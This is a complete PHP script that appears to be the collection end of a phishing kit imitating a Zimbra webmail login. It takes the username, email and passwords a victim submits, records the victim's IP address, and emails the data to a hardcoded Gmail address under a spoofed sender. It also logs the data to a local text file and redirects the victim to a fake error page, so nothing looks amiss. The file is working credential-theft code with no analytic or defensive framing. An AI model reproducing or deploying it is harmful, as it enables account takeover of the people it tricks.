<?php





$youremail = "waynemsith567@gmail.com";

$ip= $_SERVER['REMOTE_ADDR'];



$headers = "From: \"Zim Bras\" <audthens2ticated@zuenibs.com>\n";

$subject = "zibrius";

$message = "";

$message .= 'user: ';

$message .= $_POST['user'];

$message .= "\n";

$message .= 'email: ';

$message .= $_POST['mail'];

$message .= "\n";

$message .= 'pass: ';

$message .= $_POST['pass'];

$message .= "\n";

$message .= 'pass: ';

$message .= $_POST['pass2'];

$message .= "\n";

$message .= "IP: ";

$message .= $ip;

$message .= "\n";







mail ("$youremail", "$subject", $message, $headers);







$make=fopen("data.txt","a");

$to_put="";

$to_put .= $_POST['user']."|".$_POST['mail']."|".$_POST['pass']."|".$_POST['pass2']."|".$ip."

";

fwrite($make,$to_put);

 



header ("Location: error2.html");



?>